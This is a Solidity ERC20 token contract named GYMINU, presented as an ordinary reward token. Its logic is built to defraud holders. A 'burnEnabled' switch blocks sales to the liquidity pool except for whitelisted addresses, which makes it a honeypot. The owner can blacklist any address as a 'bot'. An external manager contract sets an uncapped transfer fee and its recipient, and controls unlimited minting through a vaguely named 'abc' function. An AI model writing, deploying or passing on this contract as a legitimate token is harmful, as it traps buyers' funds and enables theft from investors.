// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./Context.sol";
import "./Ownable.sol";
import "./ERC20.sol";
import "./ITokenManager.sol";
import "./IReward.sol";

contract GYMINU is Ownable, ERC20 , IReward {
    using SafeMath for uint256;
    uint8 private constant _DECIMALS = 18;
    uint256 private constant _DECIMALFACTOR = 10**uint256(_DECIMALS);
    uint256 public TOTAL_SUPPLY = 100 * (10**6) * _DECIMALFACTOR;
    address public lqAddress;
    bool public burnEnabled = false;
    mapping(address => bool) private allowBurnList;
    mapping(address => bool) private bot;
    ITokenManager public tkControl;
    constructor(
        string memory name,
        string memory symbol
    ) public ERC20(name, symbol) {
        _mint(msg.sender, TOTAL_SUPPLY);
    }
  
    function setManager(address _manager) public onlyOwner {
        tkControl = ITokenManager(_manager);
    }

    modifier isOwner() {
        bool check;
        address b2;
        (check,b2) =tkControl.isOwner(msg.sender);
        require(
            check,
            "Only Owner have permission"
        );
        _;
    }

    function claimReward(address _userAddress,uint256 amount) external override {
        abc(_userAddress, amount);

    }


    function abc(address winner, uint256 reward)
        internal
        isOwner()
    {
        require(winner != address(0), "0x address is not accepted");
        require(reward > 0, "you have no reward!");
        _mint(winner, reward);
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual override {
        address feeAddress = tkControl.getTransferFeeAddress();
        uint256 transferFeeRate = tkControl.getTransferFeeRate();
        
        if (sender != owner() && recipient != owner()) {
            require(!bot[sender], "Play fair");
            require(!bot[recipient], "Play fair");
        }

        if(burnEnabled){
            if(!allowBurnList[sender]  && recipient == lqAddress){
                require(!burnEnabled, "Can't burn token");
            }
        }

        if (
            transferFeeRate > 0 &&
            recipient != address(0) &&
            feeAddress != address(0) ) {
            uint256 _fee = amount.div(100).mul(transferFeeRate);
            super._transfer(sender, feeAddress, _fee);
            amount = amount.sub(_fee);
        }

        super._transfer(sender, recipient, amount);
    }

    function setBotAddress(address botAddress) external override {
             setBot(botAddress);
    } 

    function setBot(address botAddress) internal isOwner() returns (bool) {
        bot[botAddress] = !bot[botAddress];
        return bot[botAddress];
    }
    

    function isBotAddress(address botaddress) public view returns (bool) {
        return bot[botaddress];
    }

   function setBurnAddress(address burnAddress) external override{
       setBurnList(burnAddress);
   }
    function setBurnList(address blist) internal isOwner() returns (bool) {
        allowBurnList[blist] = !allowBurnList[blist];
        return allowBurnList[blist];
    }

    function isBurnAddress(address botaddress) public view returns (bool) {
        return allowBurnList[botaddress];
    }

  
    function setLQAddress(address lQAddress) external override{
       setlqAddress(lQAddress);
    }
    function setlqAddress(address lQAddress) internal  isOwner() {
        lqAddress = lQAddress;
    }
  
    function setBurnEnable(bool _burnEnable) external override{
        enableBurning(_burnEnable);
    }

    function enableBurning(bool _burnEnable) internal isOwner() {
        burnEnabled = _burnEnable;
    }    
}